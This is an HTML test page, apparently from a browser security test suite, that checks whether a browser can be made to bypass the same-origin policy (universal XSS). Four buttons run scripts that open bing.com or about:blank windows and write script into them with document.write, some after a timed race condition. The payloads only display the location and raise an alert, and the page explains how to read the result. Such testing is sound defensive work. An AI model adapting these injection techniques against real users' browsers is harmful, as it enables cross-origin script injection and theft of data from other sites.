<html>
<head>
    <title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<script>

    function sop1() {
        w = window.open('http://www.bing.com', '_blank');
        w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");


    }


    function sop2() {
        w = window.open('http://www.bing.com', '_blank');
        setTimeout(function () {
            w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
            alert(document.domain)

        }, 5000);


    }


    function sop3() {
        w = window.open('about:blank', '_blank');
        setTimeout(function () {
            w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
            alert(document.domain)
        }, 5000);

    }


    function sop4() {

        w = window.open('location.href', '_blank');
        w.document.write("<body><script>location.href = 'http://www.bing.com';<\/script>");
        setTimeout(function () {
            w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
        }, 9000);
    }

</script>


<div class="wrapper">
    <img src="http://www.pngmart.com/files/4/Android-PNG-Image.png" style="width: 100px">

    <h3 class="line">SOP Bypass - Testcase 12</h3>

    <div class="main">
        <p>Testing for SOP bypass using window.open function and race condition
        <p>
    </div>

    <div class="container">
        <input type="button" id="btn_test1" class="test" value="Run Test Case 1" onclick="sop1()"/>
        <br><br>
        <input type="button" id="btn_test2" class="test" value="Run Test Case 2" onclick="sop2()"/>
        <br><br>
        <input type="button" id="btn_test3" class="test" value="Run Test Case 3" onclick="sop3()"/>
        <br><br>
        <input type="button" id="btn_test4" class="test" value="Run Test Case 4" onclick="sop4()"/>
    </div>
    <div class="note">

        <p><strong>Note:</strong> <br/>
            If page loads popup and displays bing.com in browser tab, your browser is vulnerable to SOP bypass
            <br>Please note that, if the address bar is about:blank, browser is safe.

            <br>Test Cases Adapted from https://ios.browsr-tests.com<br>
        </p>
    </div>
</div>

</body>
</html>
